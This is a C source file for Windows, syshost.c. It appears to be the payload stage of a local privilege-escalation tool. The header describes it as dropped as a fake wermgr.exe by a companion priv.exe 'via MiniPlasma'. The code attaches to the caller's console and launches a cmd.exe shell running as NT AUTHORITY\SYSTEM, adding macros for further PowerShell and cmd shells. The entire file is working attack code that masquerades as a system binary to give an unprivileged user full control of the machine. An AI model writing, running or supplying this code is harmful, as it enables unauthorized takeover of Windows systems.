/*
 * syshost.c  SYSTEM shell host
 * Runs as SYSTEM (dropped as fake wermgr.exe by priv.exe via MiniPlasma).
 * Reads config, attaches to the caller's console, spawns a SYSTEM cmd/PS shell,
 * signals priv.exe when ready, then waits for the shell to exit and signals done.
 *
 * Config file: C:\ProgramData\priv_<id>.cfg
 *   Line 1: parent PID (priv.exe)
 *   Line 2: exit event name (Global\priv_exit_<id>)
 *   Line 3: ready event name (Global\priv_ready_<id>)
 *   Line 4: install dir (where priv.exe lives, for unpriv doskey)
 */
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <wchar.h>

#define CFG_PATH L"C:\\ProgramData\\priv_active.cfg"

int wmain(void) {
    /* Read config */
    DWORD  parentPid = 0;
    wchar_t exitEvt[128]  = {0};
    wchar_t readyEvt[128] = {0};
    wchar_t installDir[MAX_PATH] = {0};

    FILE *f = _wfopen(CFG_PATH, L"r");
    if (!f) return 1;
    fwscanf(f, L"%lu\n", &parentPid);
    fwscanf(f, L"%127[^\n]\n", exitEvt);
    fwscanf(f, L"%127[^\n]\n", readyEvt);
    fwscanf(f, L"%259[^\n]\n", installDir);
    fclose(f);

    /* Detach from service console (if any), attach to priv.exe console */
    FreeConsole();
    if (!AttachConsole(parentPid))
        AllocConsole();

    /* Open inheritable handles to the console */
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hIn  = CreateFileW(L"CONIN$",
        GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
        &sa, OPEN_EXISTING, 0, NULL);
    HANDLE hOut = CreateFileW(L"CONOUT$",
        GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
        &sa, OPEN_EXISTING, 0, NULL);

    /* Build unpriv path for doskey */
    wchar_t unprivCmd[MAX_PATH+32];
    swprintf(unprivCmd, MAX_PATH+31, L"\"%ls\\priv.exe\" --unpriv", installDir);

    /* Build init command: set title, doskey macros, welcome banner */
    wchar_t initCmd[4096];
    swprintf(initCmd, 4095,
        L"cmd.exe /K \""
        L"title [SYSTEM] Shell && "
        L"prompt SYSTEM $P$G && "
        L"doskey power=powershell.exe -NoLogo $* && "
        L"doskey cmdnew=start cmd.exe && "
        L"doskey psnew=start powershell.exe -NoLogo && "
        L"doskey unpriv=%ls && "
        L"echo. && "
        L"echo  [SYSTEM] Shell ready. You are NT AUTHORITY\\SYSTEM && "
        L"echo  Commands:  power  ^|  power new  ^|  cmdnew  ^|  psnew  ^|  unpriv && "
        L"echo.\"",
        unprivCmd);

    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = hIn;
    si.hStdOutput = hOut;
    si.hStdError  = hOut;

    PROCESS_INFORMATION pi = {0};
    BOOL ok = CreateProcessW(NULL, initCmd, NULL, NULL, TRUE,
                             0, NULL, NULL, &si, &pi);
    CloseHandle(hIn);
    CloseHandle(hOut);

    /* Signal priv.exe that SYSTEM shell is ready */
    HANDLE hReady = OpenEventW(EVENT_MODIFY_STATE, FALSE, readyEvt);
    if (hReady) { SetEvent(hReady); CloseHandle(hReady); }

    if (!ok) goto done;

    /* Wait for the SYSTEM cmd to exit */
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

done:
    /* Signal priv.exe that we're done (triggers cleanup) */
    HANDLE hExit = OpenEventW(EVENT_MODIFY_STATE, FALSE, exitEvt);
    if (hExit) { SetEvent(hExit); CloseHandle(hExit); }

    return 0;
}
